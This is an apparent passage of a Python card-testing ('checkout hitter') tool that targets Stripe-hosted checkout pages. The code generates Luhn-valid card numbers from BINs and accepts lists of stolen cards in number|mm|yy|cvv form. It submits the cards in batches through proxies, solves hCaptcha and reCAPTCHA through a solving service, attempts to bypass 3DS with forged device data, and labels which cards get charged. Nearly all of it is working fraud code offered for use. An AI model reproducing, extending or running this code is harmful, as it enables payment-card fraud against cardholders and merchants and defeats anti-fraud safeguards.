                amount = pi['amount']
            if 'currency' in pi:
                currency = pi['currency']
    
    if amount is None and 'order' in info and info['order']:
        order = info['order']
        if 'amount' in order:
            amount = order['amount']
        if 'currency' in order:
            currency = order['currency']
    
    if amount is None and 'subscription_data' in info:
        sub = info['subscription_data']
        if isinstance(sub, dict) and 'items' in sub:
            items = sub.get('items', [])
            if items and len(items) > 0:
                first_item = items[0]
                if 'price' in first_item and first_item['price']:
                    price = first_item['price']
                    if 'unit_amount' in price:
                        amount = price['unit_amount']
                    if 'currency' in price:
                        currency = price['currency']
    
    return amount, currency


def get_amount_from_info(info):
    amount, _ = get_amount_and_currency(info)
    return amount


def luhn_check(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0


def generate_card_from_bin(bin_number, count=1):
    bin_number = re.sub(r'\D', '', bin_number)
    
    if len(bin_number) < 6:
        raise ValueError('BIN must be at least 6 digits')
    
    cards = []
    
    for _ in range(count):
        target_length = 16
        if bin_number[:2] in ['34', '37']:
            target_length = 15
        elif bin_number[:2] in ['36', '38']:
            target_length = 14
        
        card_number = bin_number
        while len(card_number) < target_length - 1:
            card_number += str(random.randint(0, 9))
        
        total = 0
        should_double = True
        for i in range(len(card_number) - 1, -1, -1):
            digit = int(card_number[i])
            if should_double:
                digit *= 2
                if digit > 9:
                    digit -= 9
            total += digit
            should_double = not should_double
        
        check_digit = (10 - (total % 10)) % 10
        card_number += str(check_digit)
        
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        exp_month = str(random.randint(1, 12)).zfill(2)
        exp_year = current_year + random.randint(1, 5)
        
        if exp_year == current_year and int(exp_month) <= current_month:
            exp_year += 1
        exp_year = str(exp_year)[-2:]
        
        cvc = str(random.randint(1000, 9999)) if target_length == 15 else str(random.randint(100, 999))
        
        cards.append({
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvc': cvc
        })
    
    return cards[0] if count == 1 else cards


def parse_card_string(card_string):
    parts = [p.strip() for p in card_string.split('|')]
    
    if len(parts) < 4:
        raise ValueError('Card format: number|month|year|cvv')
    
    card_number = parts[0].replace(' ', '')
    exp_month = str(int(parts[1])).zfill(2)
    exp_year = parts[2]
    
    if len(exp_year) == 2:
        exp_year = '20' + exp_year
    exp_year = exp_year[-2:]
    
    return {
        'number': card_number,
        'exp_month': exp_month,
        'exp_year': exp_year,
        'cvc': parts[3]
    }


def get_card_type(number):
    if number.startswith('4'):
        return 'VISA'
    elif number[:2] in ['51', '52', '53', '54', '55']:
        return 'MC'
    elif number[:2] in ['34', '37']:
        return 'AMEX'
    elif number[:4] == '6011':
        return 'DISC'
    elif number[:2] == '35':
        return 'JCB'
    else:
        return 'CARD'


def create_payment_method(card, public_key, session_id, email, config_id=None, proxy=None):
    url = f"{STRIPE_API}/v1/payment_methods"
    
    data = {
        'type': 'card',
        'card[number]': card['number'],
        'card[cvc]': card['cvc'],
        'card[exp_month]': card['exp_month'],
        'card[exp_year]': card['exp_year'],
        'billing_details[name]': 'Test User',
        'billing_details[email]': email,
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': '1501 Gaylord Trail',
        'billing_details[address][city]': 'Grapevine',
        'billing_details[address][state]': 'TX',
        'billing_details[address][postal_code]': '76051',
        'guid': generate_stripe_guid(),
        'muid': generate_stripe_muid(),
        'sid': generate_stripe_guid(),
        'key': public_key,
        'payment_user_agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout',
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
    }
    
    if config_id:
        data['client_attribution_metadata[checkout_config_id]'] = config_id
    
    return make_request(url, data, proxy)


def detect_captcha_in_response(response):
    """
    Detect if response contains CAPTCHA challenge.
    Returns (is_captcha, captcha_info) tuple.
    """
    if not response or not isinstance(response, dict):
        return False, None
    
    captcha_info = {}
    
    # Check for explicit captcha fields
    if response.get('bot_check_required') or response.get('has_captcha'):
        captcha_info['required'] = True
    
    # Check for captcha_data with sitekey
    captcha_data = response.get('captcha_data', {})
    if captcha_data:
        captcha_info['sitekey'] = captcha_data.get('sitekey')
        captcha_info['provider'] = captcha_data.get('provider', 'hcaptcha')
        captcha_info['id'] = captcha_data.get('id')
    
    # Check bot_check structure
    bot_check = response.get('bot_check', {})
    if bot_check:
        captcha_info['sitekey'] = bot_check.get('sitekey') or captcha_info.get('sitekey')
        captcha_info['provider'] = bot_check.get('provider', 'hcaptcha')
        captcha_info['id'] = bot_check.get('id')
    
    # Check error for captcha codes
    error = response.get('error', {})
    if error:
        code = error.get('code', '')
        if 'captcha' in code.lower():
            captcha_info['error_code'] = code
            captcha_info['required'] = True
    
    # Check last_payment_error
    pi = response.get('payment_intent', {})
    if isinstance(pi, dict):
        last_error = pi.get('last_payment_error', {})
        if last_error:
            code = last_error.get('code', '')
            if 'captcha' in code.lower():
                captcha_info['error_code'] = code
                captcha_info['required'] = True
    
    is_captcha = bool(captcha_info.get('sitekey') or captcha_info.get('required') or captcha_info.get('error_code'))
    return is_captcha, captcha_info if is_captcha else None


def confirm_payment(payment_method_id, session_id, public_key, expected_amount, init_checksum='', config_id=None, proxy=None, captcha_token=None, checkout_url=None):
    """
    Confirm payment with CAPTCHA handling via NopTcha.
    Will retry with solved captcha if challenge detected.
    """
    url = f"{STRIPE_API}/v1/payment_pages/{session_id}/confirm"
    
    # Generate bypass browser data and encode as device_data
    browser_data = get_bypass_browser_data()
    device_data_json = json.dumps(browser_data, separators=(',', ':'))
    device_data_b64 = base64.b64encode(device_data_json.encode()).decode()
    
    data = {
        'eid': 'NA',
        'payment_method': payment_method_id,
        'expected_amount': str(expected_amount),
        'consent[terms_of_service]': 'accepted',
        'expected_payment_method_type': 'card',
        'guid': generate_stripe_guid(),
        'muid': generate_stripe_muid(),
        'sid': generate_stripe_guid(),
        'key': public_key,
        'version': '90ba939846',
        'init_checksum': init_checksum,
        'passive_captcha_token': captcha_token or '',
        'three_d_secure[device_data]': device_data_b64,
        'payment_method_options[card][three_d_secure][ares][device_render_options][if]': 'true',
        'payment_method_options[card][three_d_secure][ares][device_render_options][sp]': '01',
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
    }
    
    # Add captcha token if provided
    if captcha_token:
        data['bot_check[provider]'] = 'hcaptcha'
        data['bot_check[token]'] = captcha_token
    
    if config_id:
        data['client_attribution_metadata[checkout_config_id]'] = config_id
    
    response = make_request(url, data, proxy)
    
    # Check for captcha challenge in response
    is_captcha, captcha_info = detect_captcha_in_response(response)
    
    if is_captcha and not captcha_token:
        # First attempt hit captcha - try to solve
        print(color("\n[!] CAPTCHA Detected - Solving with NopTcha...", 'YELLOW'))
        
        sitekey = captcha_info.get('sitekey')
        provider = captcha_info.get('provider', 'hcaptcha')
        
        if sitekey and checkout_url:
            print(f"[*] Provider: {provider}, Sitekey: {sitekey[:20]}...")
            
            # Determine captcha type
            if 'recaptcha' in provider.lower():
                captcha_type = 'recaptcha2'
            else:
                captcha_type = 'hcaptcha'
            
            solved_token = solve_captcha_nopecha(sitekey, checkout_url, captcha_type)
            
            if solved_token:
                print(color("[+] CAPTCHA Solved - Retrying...", 'GREEN'))
                # Retry with solved captcha token
                return confirm_payment(
                    payment_method_id, session_id, public_key, expected_amount,
                    init_checksum, config_id, proxy, solved_token, checkout_url
                )
            else:
                print(color("[-] CAPTCHA Solve Failed", 'RED'))
                response['captcha_failed'] = True
                response['captcha_info'] = captcha_info
        else:
            print(f"[!] Missing sitekey or URL for captcha solve")
            response['captcha_info'] = captcha_info
    
    return response


def interpret_result(code, decline_code='', message=''):
    status_map = {
        'card_declined': ('DECLINED', 'RED'),
        'expired_card': ('EXPIRED', 'RED'),
        'incorrect_cvc': ('CVV ERROR', 'YELLOW'),
        'incorrect_number': ('INVALID', 'RED'),
        'invalid_card_number': ('INVALID', 'RED'),
        'insufficient_funds': ('NO FUNDS', 'YELLOW'),
        'processing_error': ('PROC ERROR', 'YELLOW'),
        'lost_card': ('LOST', 'RED'),
        'stolen_card': ('STOLEN', 'RED'),
    }
    
    decline_map = {
        'generic_decline': 'DECLINED',
        'do_not_honor': 'DNH',
        'insufficient_funds': 'NSF',
        'lost_card': 'LOST',
        'stolen_card': 'STOLEN',
        'expired_card': 'EXPIRED',
        'incorrect_cvc': 'CVV',
        'card_velocity_exceeded': 'VEL LIMIT',
        'fraudulent': 'FRAUD',
        'pickup_card': 'PICKUP',
        'restricted_card': 'RESTRICTED',
        'security_violation': 'SECURITY',
        'service_not_allowed': 'NOT ALLOWED',
        'transaction_not_allowed': 'NOT ALLOWED',
        'try_again_later': 'TRY LATER',
    }
    
    if code in status_map:
        return status_map[code]
    
    if decline_code in decline_map:
        return (decline_map[decline_code], 'YELLOW')
    
    return (code.upper() if code else 'UNKNOWN', 'RED')


def hit(checkout_url, card, proxy=None, amount_override=None, delay=0, stripe_session=None):
    parsed = parse_checkout_url(checkout_url)
    
    if not parsed['sessionId'] or not parsed['publicKey']:
        return {'success': False, 'status': 'INVALID_URL', 'error': 'Could not parse URL'}
    
    session_id = parsed['sessionId']
    public_key = parsed['publicKey']
    
    # Use session-based approach for proper cookie handling
    if stripe_session is None:
        stripe_session = StripeSession(proxy)
        # Don't load checkout page first - it changes server state and loses total_summary
    
    # Use same fetch method as debug mode to preserve multi-currency data
    info = fetch_checkout_info(session_id, public_key, stripe_session.session.proxies.get('http') if stripe_session.session.proxies else None)
    
    if 'error' in info:
        return {'success': False, 'status': 'FETCH_ERROR', 'error': info['error'].get('message', 'Failed')}
    
    email = info.get('customer_email') or 'test@example.com'
    config_id = info.get('config_id')
    checkout_mode = info.get('mode', 'payment')  # 'payment' or 'subscription'
    
    # Cache amount/currency from FIRST fetch
    initial_amount, initial_currency = get_amount_and_currency(info)
    print(f"[*] Amount: {initial_amount} {initial_currency.upper()} ({initial_amount/100:.2f})"
          + (f" [SUBSCRIPTION]" if checkout_mode == 'subscription' else ""))
    initial_checksum = info.get('init_checksum', '')
    
    if delay > 0:
        time.sleep(delay)
    
    pm_response = create_payment_method_session(card, public_key, session_id, email, config_id, stripe_session)
    
    if 'id' not in pm_response:
        err = pm_response.get('error', {})
        code = err.get('code', 'unknown')
        msg = err.get('message', 'Unknown')
        status, _ = interpret_result(code)
        return {
            'success': False,
            'status': status,
            'code': code,
            'message': msg,
            'card': card['number']
        }
    
    pm_id = pm_response['id']
    card_brand = pm_response.get('card', {}).get('brand', 'unknown').upper()
    card_country = pm_response.get('card', {}).get('country', 'XX')
    card_funding = pm_response.get('card', {}).get('funding', 'unknown')
    
    # Get fresh checksum but use cached amount/currency
    fresh_info = fetch_checkout_info_session(session_id, public_key, stripe_session)
    if 'error' in fresh_info:
        return {'success': False, 'status': 'FETCH_ERROR', 'error': 'Failed to get fresh checkout info'}
    
    init_checksum = fresh_info.get('init_checksum', '') or initial_checksum
    api_amount = initial_amount
    api_currency = initial_currency
    
    expected_amount = amount_override if amount_override else (api_amount or 100)
    currency = api_currency.upper()
    
    confirm = confirm_payment_session(pm_id, session_id, public_key, expected_amount, init_checksum, config_id, stripe_session, checkout_url=checkout_url, checkout_mode=checkout_mode)
    
    result = {
        'card': card['number'],
        'brand': card_brand,
        'country': card_country,
        'funding': card_funding,
        'amount': expected_amount,
        'currency': currency
    }
    
    # Check if captcha was detected but not solved
    if confirm.get('captcha_failed'):
        result['success'] = False
        result['status'] = 'CAPTCHA_FAILED'
        result['captcha_info'] = confirm.get('captcha_info')
        return result
    
    if confirm.get('captcha_info') and not confirm.get('status'):
        result['success'] = False
        result['status'] = 'CAPTCHA_REQUIRED'
        result['captcha_info'] = confirm.get('captcha_info')
        return result
    
    status = confirm.get('status', '')
    
    if status == 'complete':
        result['success'] = True
        result['status'] = 'CHARGED'
        return result
    
    pi = confirm.get('payment_intent', {})
    if isinstance(pi, dict):
        pi_status = pi.get('status', '')
        if pi_status == 'requires_action' and 'next_action' in pi:
            next_action = pi.get('next_action', {})
            action_type = next_action.get('type', '')
            
            # Check if it's a captcha challenge (not 3DS)
            if action_type == 'verify_with_microdeposits':
                result['success'] = False
                result['status'] = 'MICRODEPOSIT_REQUIRED'
                result['payment_intent'] = pi.get('id')
                return result
            
            # Check for captcha/verification in the action
            use_sdk = next_action.get('use_stripe_sdk', {})
            if isinstance(use_sdk, dict):
                sdk_type = use_sdk.get('type', '')
                # hCaptcha/reCAPTCHA often in 'stripe_challenge' type
                if 'captcha' in sdk_type.lower() or 'challenge' in sdk_type.lower():
                    result['success'] = False
                    result['status'] = 'CAPTCHA_REQUIRED'
                    result['payment_intent'] = pi.get('id')
                    result['challenge_type'] = sdk_type
                    return result
            
            # If it looks like 3DS (use_stripe_sdk with source or redirect)
            if action_type in ['use_stripe_sdk', 'redirect_to_url']:
                print(color("\n[*] 3DS Required - Attempting Session Bypass...", 'YELLOW'))
                
                # Use session-based 3DS handler with cookies
                bypass_result = handle_3ds_session(pi, public_key, stripe_session)
                
                if bypass_result.get('success'):
                    result['success'] = True
                    result['status'] = bypass_result.get('status', '3DS_BYPASSED')
                    result['payment_intent'] = pi.get('id')
                    result['3ds_bypass'] = bypass_result
                    return result
                else:
                    result['success'] = True
                    result['status'] = '3DS'
                    result['payment_intent'] = pi.get('id')
                    result['3ds_bypass'] = bypass_result
                    result['3ds_note'] = 'Session bypass attempted'
                    return result
            else:
                # Unknown action type
                result['success'] = False
                result['status'] = 'ACTION_REQUIRED'
                result['payment_intent'] = pi.get('id')
                result['action_type'] = action_type
                result['next_action'] = next_action
                return result
        if pi_status == 'succeeded':
            result['success'] = True
            result['status'] = 'CHARGED'
            return result
    
    err = confirm.get('error', {})
    if err:
        code = err.get('code', '')
        decline_code = err.get('decline_code', '')
        msg = err.get('message', '')
        status_str, _ = interpret_result(code, decline_code, msg)
        result['success'] = False
        result['status'] = status_str
        result['code'] = code
        result['decline_code'] = decline_code
        result['message'] = msg
        return result
    
    result['success'] = False
    result['status'] = 'UNKNOWN'
    result['raw'] = confirm
    return result


def format_result(result):
    card = result.get('card', '')[6:]
    status = result.get('status', 'UNKNOWN')
    
    success_statuses = ['CHARGED', '3DS', '3DS_BYPASSED', '3DS_COMPLETED', '3DS_FINGERPRINT_OK']
    
    if status in success_statuses:
        c = 'GREEN'
        symbol = '[+]'
    elif status in ['CVV ERROR', 'CVV', 'PROC ERROR', 'NSF', 'NO FUNDS', 'TRY LATER', '3DS_PENDING', 'CAPTCHA_REQUIRED', 'ACTION_REQUIRED']:
        c = 'YELLOW'
        symbol = '[~]'
    else:
        c = 'RED'
        symbol = '[-]'
    
    brand = result.get('brand', 'CARD')
    country = result.get('country', 'XX')
    funding = result.get('funding', '?')[0].upper()
    
    decline_code = result.get('decline_code', '')
    code = result.get('code', '')
    msg = result.get('message', '')
    
    if decline_code:
        response_info = f"{decline_code}"
    elif code:
        response_info = f"{code}"
    else:
        response_info = status
    
    if msg and len(msg) < 50:
        response_info += f" | {msg}"
    elif msg:
        response_info += f" | {msg[:47]}..."
    
    line = f"{symbol} ...{card[-4:]} | {brand:4} | {country} | {funding} | {response_info}"
    
    return color(line, c)


def batch_check(checkout_url, cards, proxy=None, amount_override=None, delay=0.5):
    parsed = parse_checkout_url(checkout_url)
    
    if not parsed['sessionId'] or not parsed['publicKey']:
        print(color("[!] Invalid checkout URL", 'RED'))
        return []
    
    info = fetch_checkout_info(parsed['sessionId'], parsed['publicKey'], proxy)
    
    if 'error' in info:
        print(color(f"[!] {info['error'].get('message', 'Error')}", 'RED'))
        return []
    
    api_amount, api_currency = get_amount_and_currency(info)
    
    if api_amount is None:
        print("[DEBUG] Amount extraction failed, checking fields:")
        for key in ['amount_total', 'total', 'amount', 'presentment_amount', 'computed_amount']:
            if key in info:
                print(f"[DEBUG] {key}: {info[key]}")
        if 'line_items' in info:
            items = info['line_items']
            if isinstance(items, dict) and 'data' in items:
                for item in items['data'][:2]:
                    print(f"[DEBUG] line_item: {item.get('amount_total')} / {item.get('amount')}")
    
    expected_amount = amount_override if amount_override else (api_amount or 100)
    currency = api_currency.upper()
    
    print(f"\n[*] Session: {parsed['sessionId'][:30]}...")
    if expected_amount:
        print(f"[*] Amount: {expected_amount} {currency} ({expected_amount/100:.2f})")
    else:
        print(f"[*] Amount: Unknown {currency}")
    print(f"[*] Cards: {len(cards)}")
    print("\n" + "=" * 50)
    
    results = []
    charged = 0
    threeds = 0
    declined = 0
    
    for i, card in enumerate(cards, 1):
        result = hit(checkout_url, card, proxy, amount_override, delay if i > 1 else 0)
        results.append(result)
        
        print(format_result(result))
        
        if result.get('status') == 'CHARGED':
            charged += 1
        elif result.get('status') == '3DS':
            threeds += 1
        else:
            declined += 1
    
    print("\n" + "=" * 50)
    print(f"[*] Results: {color(f'{charged} CHARGED', 'GREEN')} | {color(f'{threeds} 3DS', 'CYAN')} | {color(f'{declined} DECLINED', 'RED')}")
    
    return results


def debug_checkout(checkout_url, proxy=None):
    parsed = parse_checkout_url(checkout_url)
    
    if not parsed['sessionId'] or not parsed['publicKey']:
        print(color("[!] Could not parse URL", 'RED'))
        return None
    
    print(f"\n[*] Session: {parsed['sessionId']}")
    print(f"[*] Key: {parsed['publicKey'][:30]}...")
    
    info = fetch_checkout_info(parsed['sessionId'], parsed['publicKey'], proxy)
    
    if 'error' in info:
        print(color(f"\n[!] Error: {info['error'].get('message', 'Unknown')}", 'RED'))
        return None
    
    print("\n" + "=" * 60)
    print(color("CHECKOUT INFO:", 'CYAN'))
    print("=" * 60)
    
    amount, currency = get_amount_and_currency(info)
    currency = currency.upper() if currency else 'N/A'
    
    print(f"Amount: {amount} ({amount/100 if amount else 0:.2f} {currency})")
    print(f"Currency: {currency}")
    
    print(f"\n[Multi-Currency Fields]")
    print(f"presentment_amount: {info.get('presentment_amount')}")
    print(f"presentment_currency: {info.get('presentment_currency')}")
    print(f"computed_amount: {info.get('computed_amount')}")
    print(f"amount_total: {info.get('amount_total')}")
    print(f"total: {info.get('total')}")
    print(f"Email: {info.get('customer_email', 'N/A')}")
    print(f"Status: {info.get('status', 'N/A')}")
    print(f"Mode: {'LIVE' if info.get('livemode') else 'TEST'}")
    print(f"Config ID: {info.get('config_id', 'N/A')}")
    print(f"Checksum: {info.get('init_checksum', 'N/A')[:40]}...")
    
    if 'account_settings' in info:
        acc = info['account_settings']
        print(f"\nMerchant: {acc.get('display_name', 'N/A')}")
        print(f"Support: {acc.get('support_email', 'N/A')}")
    
    print(f"\n[All Keys in Response]")
    print(list(info.keys()))
    
    # Find where 54749 or the amount actually lives
    json_str = json.dumps(info, default=str)
    print(f"\n[total_summary value]: {info.get('total_summary')}")
    print(f"[line_item_group value]: {type(info.get('line_item_group'))}")
    
    # Check line_item_group for the due amount
    lig = info.get('line_item_group')
    if lig and isinstance(lig, dict):
        print(f"[line_item_group keys]: {list(lig.keys())}")
        if 'due' in lig:
            print(f"[line_item_group.due]: {lig.get('due')}")
        if 'currency' in lig:
            print(f"[line_item_group.currency]: {lig.get('currency')}")
    
    if 'currency_options' in info:
        print(f"\n[Currency Options]")
        print(json.dumps(info['currency_options'], indent=2, default=str)[:500])
    
    if 'display_items' in info:
        print(f"\n[Display Items]")
        print(json.dumps(info['display_items'], indent=2, default=str)[:500])
    
    if 'payment_method_specs' in info:
        specs = info['payment_method_specs']
        for spec in specs[:2] if isinstance(specs, list) else []:
            if 'amount' in str(spec):
                print(f"\n[Payment Method Spec with amount]")
                print(json.dumps(spec, indent=2, default=str)[:300])
    
    json_str = json.dumps(info, default=str)
    if '54749' in json_str:
        idx = json_str.find('54749')
        print(f"\n[Found 54749 at context]")
        print(json_str[max(0,idx-50):idx+100])
    
    print("\n" + "=" * 60)
    print(color("RAW RESPONSE (truncated):", 'CYAN'))
    print("=" * 60)
    print(json.dumps(info, indent=2, default=str)[:3000])
    
    return info


if __name__ == '__main__':
    print(color("\n" + "=" * 60, 'CYAN'))
    print(color("         STRIPE CHECKOUT HITTER - VOID!", 'BOLD'))
    print(color("=" * 60, 'CYAN'))
    
    print("\n[1] Single card hit")
    print("[2] BIN generator (batch)")
    print("[3] Multi-card check (from list)")
    print("[4] Debug checkout")
    
    mode = input("\n[?] Mode (1-4): ").strip() or "1"
    
    url = input("\n[?] Checkout URL: ").strip()
    
    if not url:
        print(color("[!] URL required", 'RED'))
        exit(1)
    
    proxy = input("[?] Proxy (ip:port:user:pass) or Enter to skip: ").strip() or None
    
    if mode == "4":
        debug_checkout(url, proxy)
        exit(0)
    
    if mode == "1":
        print("\n[1] Full card (number|mm|yy|cvv)")
        print("[2] Generate from BIN")
        choice = input("\n[?] Choice (1/2): ").strip()
        
        if choice == '1':
            cc = input("[?] Card: ").strip()
            card = parse_card_string(cc)
        else:
            bin_num = input("[?] BIN: ").strip()
            card = generate_card_from_bin(bin_num)
            print(f"[+] Generated: {card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}")
        
        print("\n" + "=" * 60)
        print("PROCESSING...")
        print("=" * 60)
        
        result = hit(url, card, proxy)
        print(format_result(result))
        print("\n" + json.dumps(result, indent=2))
    
    elif mode == "2":
        bin_num = input("[?] BIN: ").strip()
        count = int(input("[?] Count (default 5): ").strip() or "5")
        delay = float(input("[?] Delay between cards (sec, default 0.5): ").strip() or "0.5")
        
        cards = generate_card_from_bin(bin_num, count)
        batch_check(url, cards, proxy, None, delay)
    
    elif mode == "3":
        print("[?] Enter cards (number|mm|yy|cvv), one per line. Empty line to finish:")
        cards = []
        while True:
            line = input().strip()
            if not line:
                break
            try:
                cards.append(parse_card_string(line))
            except:
                print(color(f"  [!] Invalid: {line}", 'RED'))
        
        if cards:
            delay = float(input("[?] Delay between cards (sec, default 0.5): ").strip() or "0.5")
            batch_check(url, cards, proxy, None, delay)
        else:
            print(color("[!] No valid cards", 'RED'))
